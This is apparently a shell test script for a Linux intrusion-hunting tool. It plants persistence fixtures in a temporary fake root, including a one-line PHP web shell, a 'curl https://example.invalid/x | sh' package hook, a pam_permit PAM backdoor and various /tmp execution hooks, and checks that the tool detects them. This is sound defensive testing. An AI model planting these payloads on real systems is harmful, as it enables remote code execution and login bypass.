#!/bin/sh
# End-to-end pipeline fixtures only: never configure the workstation.
set -eu
REPO=$(CDPATH= cd "$(dirname "$0")/.." && pwd)
TMP=$(mktemp -d /tmp/hunter-pipeline.XXXXXXXX)
trap 'rm -rf "$TMP"' 0
trap 'exit 1' 1 2 15
ROOT=$TMP/root
mkdir -p "$ROOT/etc/pam.d" "$ROOT/etc/crontabs" "$ROOT/etc/pacman.d/hooks" \
    "$ROOT/etc/zypp/plugins/commit" "$ROOT/etc/udev/rules.d" \
    "$ROOT/etc/apache2" "$ROOT/root/.config/autostart" "$ROOT/home/team" \
    "$ROOT/opt/shop/public" "$ROOT/var/www" "$ROOT/usr/bin" "$TMP/bin"
printf 'ID=alpine\n' > "$ROOT/etc/os-release"
printf 'root:x:0:0:root:/root:/bin/sh\n' > "$ROOT/etc/passwd"
printf 'root:x:0:\n' > "$ROOT/etc/group"
printf 'auth sufficient pam_permit.so\n' > "$ROOT/etc/pam.d/sshd"
printf 'one\n' > "$ROOT/etc/tracked"
printf 'remove me\n' > "$ROOT/etc/removed"
printf 'original\n' > "$ROOT/etc/replaced"
ln -s tracked "$ROOT/etc/link"
printf 'web contents\n' > "$ROOT/var/www/index.html"
printf 'DocumentRoot /opt/shop/public\n' > "$ROOT/etc/apache2/site.conf"
printf ';auto_prepend_file = /tmp/commented.php\nauto_prepend_file = ""\n' > "$ROOT/etc/apache2/empty-php.conf"
printf 'auto_prepend_file = /opt/shop/public/injected.php\n' > "$ROOT/opt/shop/public/.user.ini"
printf '<?php system($_GET["x"]); ?>\n' > "$ROOT/opt/shop/public/door.php"
printf '* * * * * sh /tmp/job\n' > "$ROOT/etc/crontabs/root"
printf '[Action]\nExec=/tmp/package-hook\n' > "$ROOT/etc/pacman.d/hooks/99-hook.hook"
printf '#!/bin/sh\ncurl https://example.invalid/x | sh\n' > "$ROOT/etc/zypp/plugins/commit/hook"
printf 'RUN+="/tmp/device-hook"\n' > "$ROOT/etc/udev/rules.d/99-hook.rules"
printf '[Desktop Entry]\nExec=/tmp/desktop-hook\n' > "$ROOT/root/.config/autostart/task.desktop"
mkdir -p "$ROOT/opt/orphan/.ssh"
printf 'ssh-ed25519 PUBLIC_KEY_SECRET\n' > "$ROOT/opt/orphan/.ssh/authorized_keys2"
printf 'PRIVATE_KEY_SECRET\n' > "$ROOT/opt/orphan/.ssh/id_rsa"
chmod 644 "$ROOT/opt/orphan/.ssh/id_rsa"
# Deny immutable attributes in this test only, so fixture cleanup stays reversible.
for util in awk cat chmod cp date df du find grep id ls mkdir mv rm rmdir sed sort tar tee tr uname wc sha256sum realpath readlink getcap getfacl; do
    p=$(command -v "$util" || :); [ -z "$p" ] || ln -s "$p" "$TMP/bin/$util"
done
cat > "$TMP/bin/chattr" <<'MOCK'
#!/bin/sh
printf '%s\n' "$*" >> "$MOCK_CHATTR_LOG"
exit 1
MOCK
MOCK_CHATTR_LOG=$TMP/chattr.calls
export MOCK_CHATTR_LOG
printf '#!/bin/sh\nexit 1\n' > "$TMP/bin/lsattr"
chmod +x "$TMP/bin/chattr" "$TMP/bin/lsattr"
sed 's|^PATH=/usr/sbin:.*|PATH=$HUNTER_TEST_PATH|' "$REPO/hunter-setup.sh" > "$TMP/setup.sh"
HUNTER_TEST_PATH="$TMP/bin" sh "$TMP/setup.sh" --root "$ROOT" > "$TMP/setup1.out" 2> "$TMP/setup1.err"
ID1=$(cat "$ROOT/.x86/latest")
RUN1=$ROOT/.x86/runs/$ID1
[ -f "$RUN1/COMPLETE" ] && [ ! -e "$RUN1/INCOMPLETE" ]
grep -F '|/etc/pam.d/sshd' "$RUN1/manifest.sha256" >/dev/null
awk -F'|' 'length($1)!=64 || $1 ~ /[^a-f0-9]/ {exit 1}' "$RUN1/manifest.sha256"
grep '^.*|.*|/var/www$' "$RUN1/backups.sha256" >/dev/null
while IFS='|' read -r expected archive logical; do
    actual=$(sha256sum < "$RUN1/backups/$archive" | awk '{print $1}')
    [ "$expected" = "$actual" ]
    if [ "$logical" = /var/www ]; then tar -tf "$RUN1/backups/$archive" | grep 'index.html' >/dev/null; fi
done < "$RUN1/backups.sha256"
printf 'PASS: synchronous archives and SHA-256 manifest created before configuration\n'
sh "$REPO/hunter-hunt.sh" --root "$ROOT" -o "$TMP/unchanged.txt" > "$TMP/unchanged.out" 2> "$TMP/unchanged.err"
if grep -E '^\[.*\] (File changed since setup snapshot|New file since setup snapshot)' "$TMP/unchanged.txt"; then exit 1; fi
for hit in 'PAM sufficient unconditional' 'Package manager execution hook' \
    'Device event executes' 'Desktop autostart execution' 'Private SSH key readable' \
    'SSH authorization entries' 'Web request input' 'Apache CRS rules include' \
    'Web configuration automatically injects'; do
    grep -F "$hit" "$TMP/unchanged.txt" >/dev/null
done
if grep -F '/tmp/commented.php' "$TMP/unchanged.out"; then exit 1; fi
if grep -E 'PUBLIC_KEY_SECRET|PRIVATE_KEY_SECRET' "$TMP/unchanged.txt"; then exit 1; fi
printf 'PASS: unchanged compromised snapshot keeps heuristic detections, no false changes\n'
printf 'two\n' > "$ROOT/etc/tracked"
rm "$ROOT/etc/removed" "$ROOT/etc/replaced" "$ROOT/etc/link"
ln -s /etc/passwd "$ROOT/etc/replaced"
ln -s group "$ROOT/etc/link"
printf 'new\n' > "$ROOT/etc/new-file"
chmod 600 "$ROOT/etc/group"
sh "$REPO/hunter-hunt.sh" --root "$ROOT" --color always -o "$TMP/changed.txt" > "$TMP/changed.out" 2> "$TMP/changed.err"
for hit in 'SHA-256 content changed' 'permissions/ownership changed' 'File removed' \
    'Regular file replaced with symlink' 'Symlink target changed' 'New file since setup snapshot'; do
    grep -F "$hit" "$TMP/changed.txt" >/dev/null
done
esc=$(printf '\033')
grep -F "$esc[" "$TMP/changed.out" >/dev/null
if grep -F "$esc" "$TMP/changed.txt"; then exit 1; fi
printf 'PASS: additions, removals, content, mode and symlink changes; color only on screen\n'
OLD=$(sha256sum < "$RUN1/manifest.sha256")
HUNTER_TEST_PATH="$TMP/bin" sh "$TMP/setup.sh" --root "$ROOT" > "$TMP/setup2.out" 2> "$TMP/setup2.err"
ID2=$(cat "$ROOT/.x86/latest")
[ "$ID1" != "$ID2" ] && [ "$OLD" = "$(sha256sum < "$RUN1/manifest.sha256")" ]
sh "$REPO/hunter-hunt.sh" --root "$ROOT" -o "$TMP/refreshed.txt" > "$TMP/refreshed.out" 2> "$TMP/refreshed.err"
if grep -E '^\[.*\] (File changed since setup snapshot|New file since setup snapshot)' "$TMP/refreshed.txt"; then exit 1; fi
printf 'PASS: rerun appends a version, retains prior evidence and refreshes comparison\n'
# Insufficient destination capacity must fail before creating archive bytes,
# retain the prior baseline, and explain where the estimates were saved.
real_df=$(command -v df)
rm "$TMP/bin/df"
cat > "$TMP/bin/df" <<'MOCK'
#!/bin/sh
printf 'Filesystem 1024-blocks Used Available Capacity Mounted on\nfixture 1000 999 1 99%% /\n'
MOCK
chmod 700 "$TMP/bin/df"
if HUNTER_TEST_PATH="$TMP/bin" sh "$TMP/setup.sh" --root "$ROOT" > "$TMP/space.out" 2> "$TMP/space.err"; then exit 1; fi
[ "$(cat "$ROOT/.x86/latest")" = "$ID2" ]
grep 'Insufficient backup space' "$TMP/space.err" >/dev/null
space_run=$(sed -n 's|.*See \(.*\)/backup-capacity.txt$|\1|p' "$TMP/space.err")
[ -f "$space_run/INCOMPLETE" ] && [ ! -e "$space_run/COMPLETE" ]
[ -z "$(find "$space_run/backups" -type f -print)" ]
grep 'available_kib=1' "$space_run/backup-capacity.txt" >/dev/null
rm "$TMP/bin/df"
ln -s "$real_df" "$TMP/bin/df"
printf 'PASS: capacity preflight refuses oversized backups before archive writes\n'
# A failing archiver must retain the previous baseline and its exact exit status.
real_tar=$(command -v tar)
rm "$TMP/bin/tar"
cat > "$TMP/bin/tar" <<'MOCK'
#!/bin/sh
[ "${1:-}" != --help ] || exit 0
printf 'fixture archive enumeration failure\n' >&2
exit 42
MOCK
chmod 700 "$TMP/bin/tar"
if HUNTER_TEST_PATH="$TMP/bin" sh "$TMP/setup.sh" --root "$ROOT" > "$TMP/setup-failed.out" 2> "$TMP/setup-failed.err"; then exit 1; fi
[ "$(cat "$ROOT/.x86/latest")" = "$ID2" ]
grep 'tar exit 42' "$TMP/setup-failed.err" >/dev/null
find "$ROOT/.x86/runs" -name backup-status.txt -exec cat {} + | grep '|42|' >/dev/null
rm "$TMP/bin/tar"
ln -s "$real_tar" "$TMP/bin/tar"
printf 'PASS: archive failure records status and preserves previous baseline\n'
# Failure must preserve the previous pointer, including an unavailable +i policy.
if HUNTER_TEST_PATH="$TMP/bin" sh "$TMP/setup.sh" --root "$ROOT" --require-immutable > "$TMP/require.out" 2> "$TMP/require.err"; then exit 1; fi
[ "$(cat "$ROOT/.x86/latest")" = "$ID2" ]
mkdir "$ROOT/.x86/.setup-lock"
if HUNTER_TEST_PATH="$TMP/bin" sh "$TMP/setup.sh" --root "$ROOT" >/dev/null 2>&1; then exit 1; fi
rmdir "$ROOT/.x86/.setup-lock"
ln -s "$TMP/outside" "$ROOT/unsafe-state"
if sh "$REPO/hunter-setup.sh" --root "$ROOT" --state-dir /unsafe-state >/dev/null 2>&1; then exit 1; fi
if sh "$REPO/hunter-hunt.sh" --root "$ROOT" --install-tools >/dev/null 2>&1; then exit 1; fi
printf 'PASS: locking, immutable requirement, symlinked storage and offline mutation guard\n'
# Exercise the exact native install function without launching a package manager.
awk '/^install_one\(\)/ {copy=1} copy {print} copy && /^}/ {exit}' "$REPO/hunter-setup.sh" > "$TMP/install-function"
for manager in apt-get yum dnf zypper pacman apk; do
    PM=$manager FUNCTION_FILE=$TMP/install-function sh -c '
        run() { printf "%s\n" "$*"; }
        package_installed() { return 1; }
        . "$FUNCTION_FILE"
        install_one audit-test
    ' > "$TMP/$manager.command"
    grep -F audit-test "$TMP/$manager.command" >/dev/null
done
grep -F 'apt-get install -y' "$TMP/apt-get.command" >/dev/null
grep -F 'yum install -y' "$TMP/yum.command" >/dev/null
grep -F 'dnf install -y' "$TMP/dnf.command" >/dev/null
grep -F 'zypper --non-interactive install --no-recommends' "$TMP/zypper.command" >/dev/null
grep -F 'pacman -S --noconfirm --needed' "$TMP/pacman.command" >/dev/null
grep -F 'apk add --no-cache' "$TMP/apk.command" >/dev/null
printf 'PASS: apt, yum, dnf, zypper, pacman and apk native install dispatch\n'
# Execute the real PAM verifier against isolated native-tool fakes. These
# return mismatch status 1 as real verifiers do, and must still produce alerts.
awk '/^verify_pam\(\)/ {copy=1} copy {print} copy && /^}/ {exit}' "$REPO/hunter-hunt.sh" > "$TMP/verify-function"
for backend in dpkg rpm pacman apk; do
    bindir=$TMP/mock-$backend
    mkdir "$bindir" "$TMP/verify-$backend"
    for utility in awk sed grep cat; do ln -s "$(command -v "$utility")" "$bindir/$utility"; done
    case $backend in
        dpkg)
            printf '#!/bin/sh\nprintf "linux-pam: /lib/security/pam_unix.so\\n"\n' > "$bindir/dpkg-query"
            printf '#!/bin/sh\nprintf "??5?????? /lib/security/pam_unix.so\\n"\nexit 1\n' > "$bindir/dpkg" ;;
        rpm)
            cat > "$bindir/rpm" <<'MOCK'
#!/bin/sh
printf '%s\n' "$*" >> "$MOCK_CALLS"
case $1 in -qf) printf 'pam\n' ;; -V) printf 'S.5....T. /lib/security/pam_unix.so\n'; exit 1 ;; esac
MOCK
            ;;
        pacman)
            printf '#!/bin/sh\ncase $1 in -Qqo) printf "pam\\n" ;; -Qkk) printf "pam: 1 altered file\\n"; exit 1 ;; esac\n' > "$bindir/pacman"
            printf '#!/bin/sh\nprintf "/lib/security/pam_unix.so: sha256sum mismatch\\n"\nexit 1\n' > "$bindir/paccheck" ;;
        apk)
            printf '#!/bin/sh\ncase $1 in info) printf "lib/security/pam_unix.so is owned by linux-pam\\n" ;; audit) printf "U lib/security/pam_unix.so\\n"; exit 1 ;; esac\n' > "$bindir/apk" ;;
    esac
    for mock in "$bindir"/*; do [ -L "$mock" ] || chmod +x "$mock"; done
    MOCK_CALLS=$TMP/rpm.calls PATH=$bindir WORK=$TMP/verify-$backend OFFLINE=no \
        FUNCTION_FILE=$TMP/verify-function /bin/sh -c '
            unseen() { return 0; }
            emit() { printf "%s|%s\n" "$1" "$2"; }
            evidence() { :; }
            clean_text() { cat; }
            note() { :; }
            . "$FUNCTION_FILE"
            verify_pam /lib/security/pam_unix.so
        ' > "$TMP/verify-$backend.out"
    grep -F 'CRITICAL|PAM module package checksum' "$TMP/verify-$backend.out" >/dev/null
done
grep -F -- '-V --noscripts' "$TMP/rpm.calls" >/dev/null
printf 'PASS: dpkg, RPM, pacman/paccheck and APK report PAM integrity discrepancies\n'
# Service/socket parser fixtures cover systemd, OpenRC, ss and netstat layouts.
awk '/^        service_names\(\)/ {copy=1} copy {print} copy && /^        }/ {exit}' "$REPO/hunter-hunt.sh" > "$TMP/service-function"
awk '/^            listening_endpoints\(\)/ {copy=1} copy {print} copy && /^            }/ {exit}' "$REPO/hunter-hunt.sh" > "$TMP/socket-function"
cat > "$TMP/services.fixture" <<'DATA'
ssh.service loaded active running OpenSSH
disabled.service loaded inactive dead Disabled
       crond [ started ]
       stopped [ stopped ]
DATA
cat > "$TMP/ss.fixture" <<'DATA'
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp LISTEN 0 128 127.0.0.1:22 0.0.0.0:* users:sshd
tcp ESTAB 0 0 192.0.2.1:45678 192.0.2.2:443 users:curl
tcp LISTEN 0 128 [::]:8443 [::]:* users:web
udp UNCONN 0 0 127.0.0.1:53 0.0.0.0:* users:dns
DATA
cat > "$TMP/netstat.fixture" <<'DATA'
Proto Recv-Q Send-Q Local Address Foreign Address State
tcp 0 0 127.0.0.1:22 0.0.0.0:* LISTEN
tcp 0 0 192.0.2.1:45678 192.0.2.2:443 ESTABLISHED
tcp 0 0 [::]:8443 [::]:* LISTEN
udp 0 0 127.0.0.1:53 0.0.0.0:*
DATA
FUNCTIONS=$TMP FIXTURES=$TMP sh -c '
    . "$FUNCTIONS/service-function"
    . "$FUNCTIONS/socket-function"
    service_names "$FIXTURES/services.fixture" > "$FIXTURES/service-names"
    listening_endpoints "$FIXTURES/ss.fixture" > "$FIXTURES/ss-endpoints"
    listening_endpoints "$FIXTURES/netstat.fixture" > "$FIXTURES/netstat-endpoints"
'
grep -x 'ssh.service' "$TMP/service-names" >/dev/null
grep -x crond "$TMP/service-names" >/dev/null
[ "$(wc -l < "$TMP/service-names")" -eq 2 ]
cmp "$TMP/ss-endpoints" "$TMP/netstat-endpoints"
[ "$(wc -l < "$TMP/ss-endpoints")" -eq 3 ]
printf 'PASS: service activation and TCP/UDP/IPv6 listener normalization\n'
# Preparation may only set immutable flags on backup directories/archives.
awk '$1!="-R" || $2!="+i" || $NF !~ /\/backups$/ {bad=1} END {exit bad}' "$MOCK_CHATTR_LOG"
[ -w "$RUN1/manifest.sha256" ] && [ -w "$RUN1/setup.log" ]
for flag in --reinstall-core --apache-harden; do
    if sh "$REPO/hunter-setup.sh" "$flag" > "$TMP/moved.txt" 2>&1; then exit 1; fi
    grep -F 'Hardening moved to hunter-harden.sh' "$TMP/moved.txt" >/dev/null
done
if grep -E 'SecRuleEngine|a2enmod|install --reinstall|\$PM.*reinstall' "$REPO/hunter-setup.sh"; then exit 1; fi
printf 'PASS: setup rejects hardening actions and limits immutability to backups\n'
# Existing tool packages must not be upgraded/reinstalled during preparation.
PM=apt-get FUNCTION_FILE=$TMP/install-function sh -c '
    package_installed() { return 0; }
    log() { :; }
    run() { printf "unexpected install\n"; exit 99; }
    . "$FUNCTION_FILE"
    install_one sudo
' > "$TMP/keep-installed.out"
[ ! -s "$TMP/keep-installed.out" ]
# Logging-only updates retain permissions instead of tightening live configs.
awk '/^put\(\)/ {copy=1} copy {print} copy && /^}/ {exit}' "$REPO/hunter-setup.sh" > "$TMP/put-function"
printf 'LogLevel INFO\n' > "$TMP/logging-config"
chmod 644 "$TMP/logging-config"
TARGET=$TMP/logging-config FUNCTION_FILE=$TMP/put-function sh -c '
    path() { printf "%s\n" "$1"; }
    safe_dir() { :; }
    die() { printf "%s\n" "$*" >&2; exit 1; }
    . "$FUNCTION_FILE"
    printf "LogLevel VERBOSE\n" | put "$TARGET" 600
'
[ "$(ls -ld "$TMP/logging-config" | awk '{print $1}')" = -rw-r--r-- ]
grep -x 'LogLevel VERBOSE' "$TMP/logging-config" >/dev/null
printf 'PASS: preparation retains installed tools and existing config permissions\n'
if command -v ruby >/dev/null 2>&1; then
    ruby - "$REPO/ansible/pipeline.yml" <<'RUBY'
require 'yaml'
plays = YAML.load_file(ARGV.fetch(0))
%w[hunt.yml harden.yml].each do |name|
  entry = plays.find { |play| play['ansible.builtin.import_playbook'] == name }
  abort "Unsafe default phase: #{name}" unless entry && entry.fetch('tags', []).include?('never')
end
prep = plays.find { |play| play['ansible.builtin.import_playbook'] == 'setup.yml' }
abort 'Preparation is not enabled by default' unless prep && !prep.fetch('tags', []).include?('never')
RUBY
    printf 'PASS: default Ansible pipeline prepares only; hunting/hardening require explicit tags\n'
fi
